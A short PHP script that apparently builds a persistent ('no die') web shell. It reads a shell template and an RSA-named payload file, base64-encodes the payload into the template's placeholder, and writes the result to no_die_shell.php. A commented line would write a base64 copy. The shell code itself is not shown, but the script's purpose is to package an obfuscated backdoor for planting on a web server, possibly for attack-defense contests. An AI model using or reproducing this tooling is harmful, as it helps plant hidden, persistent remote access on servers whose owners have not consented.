<?php

$nodie = file_get_contents("./no_die_shell_template.php");

$shell = file_get_contents("./rsa_public_template.php");

$res = str_replace("SHELLSHELLSHELL", base64_encode($shell), $nodie);

file_put_contents("./no_die_shell.php", $res);

// file_put_contents("./no_die_shell.b64", base64_encode($res));
